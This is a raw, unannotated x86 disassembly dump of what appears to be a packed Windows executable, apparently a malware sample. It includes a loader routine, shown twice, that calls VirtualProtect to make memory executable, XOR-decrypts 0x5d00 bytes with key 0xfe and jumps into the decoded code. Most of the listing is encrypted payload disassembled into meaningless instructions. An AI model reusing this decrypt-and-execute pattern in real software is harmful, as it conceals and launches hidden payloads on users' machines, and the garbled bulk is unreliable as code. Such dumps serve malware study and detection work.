retn
sub_470d64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_463320
lea eax [ esi + 0x70 ]
call sub_404050
mov [ esi + 0x78 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_470da8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4633b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_470dd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470df5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470dfc
retn
sub_470e0c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc edi
add [ eax ] ch
add eax [ eax ]
add [ eax - 0x36 ] ch
inc esp
add [ eax + esi * 4 - 0x96fffbf ] dh
inc esp
add [ eax + edi * 8 + 0x44 ] al
add al bl
xor al 0x40
add [ eax + 0x2c00451c ] dh
xor al [ eax ]
dec eax
xor al [ eax ]
lodsb [ esi ]
clc
inc esp
add [ eax - 0x16 ] al
inc edi
add [ eax + 0xf ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
adc [ edi ] al
sub [ ebx ] al
add [ eax ] al
push 0xb40044ca
mov al 0x41
add [ eax + 0x440044f6 ] dl
clc
inc esp
inc ebx
add [ esi + edi * 8 ] bl
inc esp
add [ edi + eax * 2 + 0x41 ] ch
add [ edx + edi * 8 + 0x44 ] ch
add [ eax - 0x4bffbb06 ] ch
sti
inc esp
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ esp + eax ] ch
inc ebp
add [ ebp + ebp * 4 + 0x3fcc0041 ] ch
inc ebp
add [ esi * 8 - 0x1aabffbc ] al
inc ebx
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ ecx + eax ] cl
inc ebp
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax ] al
add al [ ebp ]
jl r-xdata
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + edi * 8 - 0x15bfffbc ] ch
inc ebx
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add ah dh
add eax [ ebp ]
rol [ edx ] 0x45
add [ eax + 0x78 ] al
inc ebx
add [ esp + eax + 0x45 ] ch
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
add al 0xf4
inc esp
add [ eax ] dl
or eax [ ebp ]
or al 0xb4
inc ebx
add ah dl
pop ss
inc ebp
add [ ebx + ebx ] dh
inc ebp
add al dh
sbb [ ebp ] eax
movsb [ edi ] [ esi ]
mov ah 0x43
add [ eax + 0x6c0043b4 ] ch
sbb al 0x45
add [ eax ] cl
mov bl 0x43
add [ eax + 0x600043df ] al
and eax [ ebp ]
adc cl dh
inc ebx
add ah bh
fild [ ebx ]
je r-xdata
add [ eax ] al
or eax 0x4f506449
push eax
xor edx [ ebx + 0x65 ]
jb r-xdata
inc ebp
add al bh
in eax dx
inc esp
add [ eax + 0x540044f0 ] ch
sub [ ebp ] eax
nop
stc
inc esp
add [ edx + edi * 8 ] cl
inc esp
add [ esp + edi + 0x45 ] dl
add al cl
test [ eax + eax + 0x58 ] 0x37
inc ebp
add [ eax ] bh
push ds
inc ebp
add [ ecx + edi ] cl
inc ebp
add al dh
add eax [ ebp ]
or al 0x0
aas
adc [ edi ] al
clc
add al [ eax ]
add [ eax ] al
add [ 0x4f506449 ] cl
push ebx
popad
jbe r-xdata
jb r-xdata
xor [ eax + eax ] ecx
adc bl bh
inc esi
add [ ebp + edi * 2 + 0x46 ] ch
add [ edi + eax * 4 - 0x311fffbb ] dh
inc esp
imul esp [ ecx + 0x6c ] 0x1831676f
add eax [ eax ]
pop es
inc edx
jne r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ 0x65536449 ] dl
jb r-xdata
jo r-xdata
imul esp [ ecx + 0x6c ] 0x1c31676f
add eax [ eax ]
add [ edx ] cl
add [ esi ] cl
push edx
jo r-xdata
je r-xdata
add [ ebx ] cl
inc esi
outsd
outsb
je r-xdata
jb r-xdata
inc edi
add [ edi ] al
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
cld
outsb
je r-xdata
add [ eax + 0x5e0044cb ] dh
add [ 0x74696e55 ] al
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x2431676f
xor [ bx + si ] esp
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
js r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
xor [ esi + ecx + 0x47 ] edx
add [ eax ] al
pop esp
add [ ecx + eax * 4 + 0x42 ] cl
add [ ebx + edi * 2 + 0x42 ] bh
add [ ebp + 0x10780040 ] cl
ja r-xdata
add ah bh
jb r-xdata
push r-xdata
call sub_471094
push ss
fwait
cmpsb [ esi ] [ edi ]
push ebx
call VirtualProtect
xor eax eax
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5cff
add eax [ eax ]
add [ eax ] cl
xor [ bx + si ] ebx
or al 0x3
add [ eax ] al
add eax 0x6f430900
insd
bound ebp [ edi + 0x42 ]
outsd
add eax [ eax ]
add [ ecx ] cl
add [ ebx ] dl
push eax
jb r-xdata
insb
outsd
xor [ si ] ebx
adc [ ebx ] al
add [ eax ] al
push es
adc al 0x3
add [ eax ] al
pop es
add [ ebx ] cl
push ebx
dec esp
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ edx ] cl
push ebp
jo r-xdata
nop
mov [ ebp - 0x8 ] eax
nop
mov edx [ ebp - 0x8 ]
add edx ebx
mov dl [ edx ]
nop
nop
xor dl 0xfe
mov ecx [ ebp - 0x8 ]
add ecx ebx
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5d00
jne r-xdata
nop
add ebx 0xfb0
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
retn 0x42
add ah dl
je r-xdata
insb
outsd
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
jo r-xdata
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ esi ] al
add al 0x3
add [ eax ] al
xchg [ ebp ] eax
loopne r-xdata
imul esp [ ecx + 0x6c ] 0x2031676f
add eax [ eax ]
add [ ebx ] cl
add [ eax ] dl
push eax
popad
push ebx
je r-xdata
insb
outsd
xor [ si ] esp
inc edx
add [ eax - 0x2bffbd29 ] ah
sub_471094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push r-xdata
call sub_471094
push ss
fwait
cmpsb [ esi ] [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5cff
push ebx
call VirtualProtect
xor eax eax
nop
mov [ ebp - 0x8 ] eax
nop
mov edx [ ebp - 0x8 ]
add edx ebx
mov dl [ edx ]
nop
nop
xor dl 0xfe
mov ecx [ ebp - 0x8 ]
add ecx ebx
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5d00
jne r-xdata
nop
add ebx 0xfb0
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
sub_4715ba
xchg esp eax
xchg edi eax
cwde
ja r-xdata
test al 0xa9
push ss
loope r-xdata
adc [ edi ] dl
push eax
call 0x6eb614c5
outsb
jae r-xdata
jpo r-xdata
int1
jpe r-xdata
push ds
pop ss
retn
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ecx + 0x5a ] ebp
int1
jpe r-xdata
loop r-xdata
int1
jpo r-xdata
iretd
into
pop ss
xor bh 0xfe
loope r-xdata
sub_4715e2
lodsd [ esi ]
xchg esp eax
cli
pop ss
into
mov edi 0xa7a7fefe
jne r-xdata
js r-xdata
pop ss
pushad
retn 0xfefe
dec edx
push es
add [ ecx ] eax
scasb [ edi ]
pop ss
mov cl 0xc3
clc
sub_47175c
cmpsd [ esi ] [ edi ]
pop ss
mov [ 0x6efefeea ] al
outsb
outsb
outsb
cwde
ja r-xdata
outsb
outsb
outsb
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
jne r-xdata
rcr [ eax - 0x5eeb7c89 ] cl
xchg esp eax
xchg edx eax
movsb [ edi ] [ esi ]
cwde
ja r-xdata
push ss
or ah dh
pop ss
and al 0xac
outsb
rcl [ edi ] 0x1
out 0xed al
sub_4717c0
cmp [ edx - 0xe031126 ] bh
dec ecx
mov ebp 0x3e7b98ba
int1
jpe r-xdata
jge r-xdata
0x9a7dfefe 0xeada
add bh dh
test al 0x75
push cs
pop ss
cmp eax 0x77fefebe
sbb dl 0xd2
mov [ edx + 0x7bf1e2da ] 0xfefefefb
cmp [ edx - 0x38011126 ] bh
sbb dl 0xca
int1
jpo r-xdata
fcmove st2
sub_47184e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jpo r-xdata
sar dh 0xfe
outsb
std
mov ebx 0xbfda17f6
int1
jpe r-xdata
scasb [ edi ]
jne r-xdata
iretd
scasd [ edi ]
pop ss
mov bh 0xef
pop ss
in eax 0x1
add [ ecx ] eax
outsb
outsb
add [ ebx + 0x2bb77e6 ] ecx
scasb [ edi ]
pop ss
adc dh [ ebx + 0x6e6efefe ]
outsb
outsb
outsb
outsb
outsb
outsb
add [ eax + 0x52 ] ebp
sub_473e0f
xchg [ ebp - 0x65 ] bh
add bh dh
std
aas
jne r-xdata
loop r-xdata
cwde
ja r-xdata
cmpsb [ esi ] [ edi ]
ficom [ edi ]
sbb eax 0x6e010116
outsb
jpo r-xdata
out dx al
int 0x25
cwde
add [ ecx ] eax
int 0x3e
pop ss
mov ch 0xe9
push ss
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpo r-xdata
in al dx
jne r-xdata
xchg esp eax
mov [ ebp + 0x1085317 ] fs
dec esi
add eax [ ecx ]
outsb
outsb
outsb
outsb
jae r-xdata
hlt
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
jge r-xdata
cwde
ja r-xdata
fdivrp st1
jpe r-xdata
jae r-xdata
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
mov edx 0x17a58c94
push ebx
or [ ecx ] al
mov [ 0xffffffff982775f2 ] eax
ja r-xdata
sbb [ ecx ] al
add [ edi ] edx
and bh al
ja r-xdata
mov [ 0xffffffff9825cdee ] eax
add eax [ ecx ]
add [ esi ] edx
leave
or al 0x1
add [ ebx + 0x3e ] edi
int1
jpe r-xdata
add [ esi ] edx
mov bl 0xc
add [ ecx ] eax
outsb
outsb
cwde
ja r-xdata
sbb [ ecx ] al
add ebp ecx
mov esi 0x1183117
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
sub_473e43
dec esi
outsb
outsb
cwde
ja r-xdata
sbb [ ecx ] al
add ebp ecx
mov esi 0x1183117
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
hlt
add [ ecx ] eax
int 0x3e
pop ss
mov ch 0xe9
push ss
jae r-xdata
xchg esp eax
mov [ ebp + 0x1085317 ] fs
dec esi
add eax [ ecx ]
ja r-xdata
fdivrp st1
jpe r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpo r-xdata
jae r-xdata
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
mov edx 0x17a58c94
push ebx
or [ ecx ] al
mov [ 0xffffffff982775f2 ] eax
ja r-xdata
sbb [ ecx ] al
add [ edi ] edx
and bh al
outsb
mov [ 0xffffffff9825cdee ] eax
ja r-xdata
add eax [ ecx ]
add [ esi ] edx
leave
or al 0x1
add [ ebx + 0x3e ] edi
int1
jpe r-xdata
add [ esi ] edx
mov bl 0xc
add [ ecx ] eax
jpo r-xdata
in al dx
jne r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
jge r-xdata
cwde
sub_473f76
push ss
sub al [ ecx ]
add [ ecx ] eax
jne r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
stosd [ edi ]
pop ss
fdiv st7
div [ ebp - 0x49 ]
retn 0xa875
sub_474959
dec [ ecx ]
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push ss
out 0x24 eax
add [ ecx ] eax
int1
dec ecx
mov eax 0x6bb01f8
jge r-xdata
add dl dh
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
pop ss
fist [ edi ]
add [ ecx ] eax
outsb
int 0x3e
cwde
ja r-xdata
add [ ecx ] eax
aad 0x3f
das
push es
cmp eax 0x6e6e6e6e
cmpsb [ es : esi ] [ edi ]
xchg esp eax
xchg ebx eax
cwde
ja r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
mov eax [ 0xfffffffffc7bf1a5 ]
outsb
outsb
outsb
outsb
and ah [ esi + 0x77988e94 ]
mov ebx 0x155b1720
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jge r-xdata
or eax [ ebx + 0x7877adc2 ]
add bh dh
0x8c173e7b 0xfefa
sub_4749c5
outsb
outsb
outsb
lds ecx [ esi ]
int1
jl r-xdata
outsb
outsb
int1
dec ecx
out dx eax
cwde
ja r-xdata
xor [ ecx ] al
add [ ecx + 0x6e6e3da0 ] esp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
push ss
adc [ 0x55960101 ] ecx
or eax [ ebx + 0x7877adc2 ]
add bh dh
jpo r-xdata
pop ss
sbb al 0x12
add [ ecx ] eax
outsb
outsb
mov esi 0x6e6e3d37
outsb
outsb
outsb
cwde
jge r-xdata
fdivp st6
outsb
outsb
test eax 0x1612a377
test al 0x25
add [ ecx ] eax
pop ss
xchg dl ah
push es
add eax [ ecx ]
add [ esi ] edx
push ss
add [ ecx ] eax
add [ ebp - 0x55 ] esi
push ss
jae r-xdata
add [ esi + 0x6e ] ebp
sub_474af6
lodsd [ esi ]
test al 0xa9
xchg esp eax
mov fs [ ecx + 0x39758c94 ]
cwde
ja r-xdata
js r-xdata
0xa49194a6 0x9d94
add [ eax + 0x171c8377 ] ebx
and [ ecx + eax ] ebx
add [ esi + 0x6e ] ebp
outsb
test eax 0x1612a377
test al 0x25
add [ ecx ] eax
pop ss
xchg dl ah
sub_474b61
add [ ecx ] eax
scasb [ edi ]
jne r-xdata
loop r-xdata
test [ ecx ] 0xae
fidivr [ ebx + 0x3e ]
int1
jpe r-xdata
sbb ch [ ebp - 0x1aa9e952 ]
cmp al 0x98
ja r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
test eax 0x759ea801
jpo r-xdata
adc [ ecx ] al
add [ ecx + 0x57a7373 ] ebp
add [ ecx ] eax
jae r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
stosd [ edi ]
loopne r-xdata
mov esi esi
scasb [ edi ]
cwde
ja r-xdata
int1
jpe r-xdata
mov bl 0x56
jb r-xdata
jne r-xdata
fidiv [ edx + 0x7f ]
adc ah [ esi - 0x2 ]
pop ss

xchg esp eax
shl [ eax + 0x77989b94 ] 0x1
mov ebx 0x983875de
ja r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
test al 0x73
jae r-xdata
push esi
cmpsd [ esi ] [ edi ]
jpo r-xdata
clc
sbb eax [ ecx ]
add eax [ ecx ]
add [ eax - 0x67977c89 ] ebx
ja r-xdata
popad
add [ ecx ] al
add [ edi ] edx
add [ ecx ] eax
push ss
loop r-xdata
cwde
ja r-xdata
fcom [ edi ]
mov dh 0x31
add [ ecx ] eax
outsb
cwde
ja r-xdata
ja r-xdata
pop ss
sbb cl [ eax ]
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
ja r-xdata
fwait
cwde
ja r-xdata
add dl [ edi ]
outsb
pop esi
cwde
ja r-xdata
jne r-xdata
jae r-xdata
and al 0xa4
xchg esp eax
iretd
mov dl 0x3b
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
push cs
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpe r-xdata
stosb [ edi ]
push ss
push eax
sgdt [ ecx ]
pop ss
adc [ esi + 0x36759094 ] ah
jmp r-xdata
mov ebx 0x9394a6e6
cwde
ja r-xdata
add al 0x96
cli
sub ch [ esi + 0x77ae8801 ]
mov [ 0x8cb172a ] eax
add [ ecx ] eax
outsb
cwde
ja r-xdata
xchg esi eax
loop r-xdata
add [ ecx ] eax
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ebx - 0x2156fee6 ] ecx
ja r-xdata
adc ch [ esi + 0x11b6017 ]
outsb
stc
pop ss
or esp [ eax ]
add [ ecx ] eax
outsb
test eax 0xcd13bb77
and eax 0xae02bb73
lodsd [ esi ]
lodsd [ esi ]
jae r-xdata
inc edx
ja r-xdata
add [ ebx - 0x9448a0e ] ecx
pop ss
in al 0xa6
xchg esp eax
nop
cwde
ja r-xdata
sbb al 0x1
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
pop ss
adc [ ebx ] 0x3ecd0101
and al 0x75
cmp [ eax - 0x59dd4489 ] bl
xchg esp eax
mov [ ebp + 0x6 ] dh
cwde
ja r-xdata
add [ esi + 0x6e ] ebp
ja r-xdata
push ds
call 0x6eb649e0
add [ esi + 0x6e ] ebp
mov al [ 0x6e6e6e3d ]
outsb
and [ ebp ] dh
cwde
ja r-xdata
pop ss
or [ edi ] edx
add [ ecx ] eax
cwde
ja r-xdata
sahf
push ss
pop esi
sgdt [ ecx ]
xchg esi eax
sub [ edi + 0x17a99499 ] 0x6f
adc al [ ecx ]
add [ esi + 0x6e ] ebp
cwde
ja r-xdata
outsb
push es
add eax [ ecx ]
add [ esi ] edx
push ss
add [ ecx ] eax
add [ ebp - 0x55 ] esi
push ss
jpo r-xdata
jae r-xdata
pop ss
sbb al 0x12
add [ ecx ] eax
outsb
outsb
int1
dec ecx
out dx eax
cwde
ja r-xdata
push ds
int 0x1
cwde
ja r-xdata
jpo r-xdata
push edx
jne r-xdata
ja r-xdata
adc ah [ esi + 0x77989b94 ]
mov ebx 0x9094a610
jne r-xdata
mov esi 0x6e6e3d37
outsb
outsb
outsb
cwde
jge r-xdata
fdivp st6
outsb
test eax 0x1612a377
test al 0x25
add [ ecx ] eax
pop ss
xchg dl ah
sbb al 0x17
and [ ecx + eax ] ebx
add [ esi + 0x6e ] ebp
mov edx [ edx + 0x75 ]
add eax [ ecx ]
add [ esi ] edx
imul [ esi + 0x56b37798 ]
inc esi
sub [ ecx ] al
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esp eax
out dx al
jae r-xdata
push 0x5ea37798
out dx eax
add [ ecx + 0x2bb77de ] ebp
pop ss
cwde
sub_47514a
pop ss
or [ ecx + eax ] cl
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
pop ss
int1
add [ ss : ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
retn
sub_4751be
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
outsb
outsb
outsb
outsb
add [ eax + 0x4a ] ebp
inc edx
add al 0x1
add [ esi - 0x51d1448d ] ebp
lodsd [ esi ]
pop ss
fadd [ ecx ]
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
mov eax [ 0x6e3da5a0 ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cmpsd [ esi ] [ edi ]
mov eax [ 0xffffffffcc173e7b ]
call 0x6eb65103
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jne r-xdata
0x3517
sub_47527c
xchg esp eax
out dx al
jae r-xdata
cmp [ ecx ] eax
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ eax + 0x4a ] ebp
dec esi
test al 0x17
xor edx [ edi ]
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int 0x3e
mov eax [ 0x135ce17 ]
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
jae r-xdata
outsb
outsb
mov al [ 0x1ae0101 ]
imul edx [ esi ] 0x7dfefefe
cmp al dh
pop ss
shl [ ecx + eax ] 0x1
outsb
outsb
pop ss
xchg ebp eax
das
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
test eax 0x12b2f16
add [ ebp + 0x3a ] edi
0x129bb17 0x6e01
adc al 0xa6
jge r-xdata
xchg esp eax
cdq
pop ss
adc [ esi ] al
add [ ecx ] eax
aad 0x31
cwde
lds ecx [ 0xdd47bf1 ]
add [ ecx ] eax
pop ss
into
xchg esp eax
pushfd
cmpsb [ esi ] [ edi ]
xchg esp eax
0x16bb7798 0x94a6
lahf
cwde
ja r-xdata
cmpsd [ esi ] [ edi ]
int 0x3e
mov esi 0x1137e17
add [ esi + 0x6e ] ebp
outsb
int 0x37
cwde
ja r-xdata
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cwde
cmp [ ebx + 0x772e0107 ] edi
mov [ 0xfffffffffaa80102 ] eax
pop ss
xor al 0x5
add [ ecx ] eax
outsb
stosd [ edi ]
jne r-xdata
cmp eax 0x6e6e6e6e
sub_475550
pop ss
ja r-xdata
cwde
ja r-xdata
add [ ecx ] eax
outsb
outsb
int 0x3e
mov eax [ 0x6e6e3d37 ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
pop ss
0x98010112 0xa377
outsb
int1
jpo r-xdata
add cl ch
and eax 0xa37798
jne r-xdata
add [ es : ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jne r-xdata
sbb al 0x1
add [ edi ] edx
dec eax
int1
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
dec ecx
into
cwde
ja r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ecx - 0xda3e81e ] ebp
cwde
ja r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
xchg esi eax
push es
xor al cl
mov bh 0xa9
ja r-xdata
cld
pop ss
int1
xor al [ ecx ]
add [ esi + 0x6e ] ebp
outsb
xchg esp eax
xchg edi eax
cwde
ja r-xdata
pop esi
xchg esp eax
mov ebx 0xb5b3a812
test al 0x98
cmp [ ebx + 0x39feb30e ] edi
mov ebx 0x9d97b326
mov [ edi ] ss
popfd
xor [ ecx ] al
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
scasb [ edi ]
pop ss
push ss
or eax [ ecx ]
add [ esi + 0x6e ] ebp
outsb
outsb
push ss
xchg ah ch
push ds
movsd [ edi ] [ esi ]
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
ja r-xdata
outsb
outsb
cli
push ss
inc ebx
sbb [ ecx ] eax
add [ esi - 0x37a68662 ] edx
test eax 0xfe4e7877
cwde
ja r-xdata
mov [ 0x758d945e ] eax
daa
push es
jne r-xdata
xchg esp eax
enter 0x6e17 0x2e
add [ ecx ] eax
adc ah [ esi + 0x77988894 ]
mov ebx 0x9b94a610
movsd [ edi ] [ esi ]
cwde
ja r-xdata
xchg esp eax
mov [ eax - 0x59ef4489 ] bl
pop esp
jne r-xdata
outsb
outsb
mov eax [ 0x6e3d37a5 ]
outsb
push es
add [ ecx ] eax
pop ss
cmpsb [ esi ] [ edi ]
sti
lea esi [ ebp + 0x27 ]
add al ch
mov ebx 0x5c7af106
jmp 0xffffffffa65f54e4
outsb
outsb
int1
jpo r-xdata
push cs
xchg esp eax
jge r-xdata
cwde
ja r-xdata
xchg esp eax
fwait
cmpsb [ esi ] [ edi ]
pop edx
movsd [ edi ] [ esi ]
xchg esp eax
mov bl [ eax - 0x5aa75c89 ]
pop ss
mov ecx ebp
sub_475dfb
dec ebp
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
int1
jpo r-xdata
add [ ebx + 0x497c171a ] ecx
add [ ecx ] eax
xchg esp eax
ficomp [ eax - 0x5bdf5489 ]
xchg esp eax
lea ebx [ eax + 0x171eab77 ]
test [ edx ] ah
add [ ecx ] eax
outsb
int1
jpe r-xdata
dec ebx
add [ ecx ] eax
int 0x3e
pop ss
inc edx
dec eax
add [ ecx ] eax
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
lodsd [ esi ]
add [ ecx ] al
mov bl dl
dec ecx
add [ ecx ] eax
xchg esp eax
cli
xchg esi eax
dec dh
sub_475ea5
push ss
aad 0x21
add [ ecx ] eax
xchg esi eax
movsd [ edi ] [ esi ]
mov esi [ esi + ecx - 0x57 ]
ja r-xdata
cmpsb [ esi ] [ edi ]
cwde
ja r-xdata
mov dl 0x16
jecxz r-xdata
add [ esi + ebx * 8 + 0x20ab7798 ] edx
movsb [ edi ] [ esi ]
xchg esp eax
lea ebx [ eax + 0x171eab77 ]
test [ edx ] ah
add [ ecx ] eax
outsb
int1
jpe r-xdata
or dl [ edi ]
dec edi
idiv esi
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
add [ ecx ] eax
jne r-xdata
add [ ecx ] al
mov bl dl
dec ecx
add [ ecx ] eax
xchg esp eax
cli
xchg esi eax
dec dh
push edx
scasd [ edi ]
xchg esp eax
mov esi 0x13f1417
add [ esi + 0x37 ] ebp
cmp eax 0x6e6e6e6e
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
cmp [ ebx - 0x6d2423f6 ] edi
lea edi [ ecx ]
mov ebx 0xdcdedc06
fstp [ ecx ]
mov ebx 0xdc8d9202
inc [ ecx ]
push 0xfefefe46
jpo r-xdata
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jae r-xdata
xchg esi eax
0xa98b0d78 0xa077
mov dh 0x16
and [ ecx ] eax
add [ edi - 0x48 ] esi
0x5c96
outsb
jae r-xdata
int1
ficom [ edi ]
dec ebx
cmp [ ecx ] eax
add [ esi + 0x6e ] ebp
outsb
outsb
outsb
outsb
outsb
outsb
outsb
jne r-xdata
add [ ecx ] eax
xchg esi eax
inc edx
jpe r-xdata
inc edx
add al 0x1
add ecx esi
cli
jne r-xdata
push es
jae r-xdata
